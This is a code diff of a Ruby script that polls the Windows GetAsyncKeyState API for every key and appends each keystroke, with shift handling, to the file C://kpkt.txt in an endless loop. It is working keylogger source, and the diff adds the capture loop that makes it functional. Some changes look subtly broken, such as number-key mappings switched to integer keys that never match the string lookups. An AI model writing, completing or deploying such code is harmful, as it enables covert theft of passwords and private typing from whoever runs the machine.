@@ -1,7 +1,11 @@
 require 'Win32API'
 
-LSHIFT = 0xA0
-RSHIFT = 0xA1
+VK_SHIFT = 0x10
+VK_ESC = 0x1B
+
+def check_shifts()
+	$listener.call(VK_SHIFT) != 0 ? true : false
+end
 
 # create empty Hash of key codes
 keys = Hash.new
@@ -21,14 +25,14 @@ keys['/'] = 0xBF; keys['`'] = 0xC0; keys['['] = 0xDB; keys[']'] = 0xDD; keys["'"
 keys['\\'] = 0xDC
 
 # add custom key macros
-keys['\n'] = 0x0D; keys['\t'] = 0x09; keys['(backspace)'] = 0x08; keys['(CAPSLOCK)'] = 0x14
+keys["\n"] = 0x0D; keys["\t"] = 0x09; keys['(backspace)'] = 0x08; keys['(CAPSLOCK)'] = 0x14
 
 # add for uppercase letters
 ('a'..'z').each { |char| uppercase[char] = char.upcase }
 
 # add for uppercase numbers
-uppercase['1'] = '!'; uppercase['2'] = '@'; uppercase['3'] = '#'; uppercase['4'] = '$'; uppercase['5'] = '%'
-uppercase['6'] = '^'; uppercase['7'] = '&'; uppercase['8'] = '*'; uppercase['9'] = '('; uppercase['0'] = ')'
+uppercase[1] = '!'; uppercase[2] = '@'; uppercase[3] = '#'; uppercase[4] = '$'; uppercase[5] = '%'
+uppercase[6] = '^'; uppercase[7] = '&'; uppercase[8] = '*'; uppercase[9] = '('; uppercase[0] = ')'
 
 # add for uppercase special characters
 uppercase[';'] = ':'; uppercase['='] = '+'; uppercase[','] = '<'; uppercase['-'] = '_'; uppercase['.'] = '>'
@@ -36,23 +40,22 @@ uppercase['/'] = '?'; uppercase['`'] = '~'; uppercase['['] = '{'; uppercase[']']
 uppercase['\\'] = '|'
 
 # create a listener for Windows key-presses
-listener = Win32API.new('user32', 'GetAsyncKeyState', ['i'], 'i')
+$listener = Win32API.new('user32', 'GetAsyncKeyState', ['i'], 'i')
 
-# check to see if the most significant bit is set
-def check_msb(n)
-	return n.to_s(2)[0]
-end
-
-# check to see if the least significant bit is set
-def check_lsb(n)
-	return n.to_s(2)[-1]
-end
-
-# check to see if either shift key is currently being pressed
-def check_shifts()
-	return false unless check_msb(listener.call(LSHIFT)) or check_msb(listener.call(RSHIFT))
-	return true
-end
+# call listener once to initialize lsb's
+keys.each_value { |code| $listener.call(code) }
 
 logs = File.open('C://kpkt.txt', 'a')
+
+while true
+	break if $listener.call(VK_ESC) != 0
+
+	keys.each do |char, code|
+		n = $listener.call(code)
+		if n and n & 0x01 == 1
+			check_shifts() ? logs.write("#{uppercase[char]}") : logs.write("#{char}")
+		end
+	end
+end
+
 logs.close()
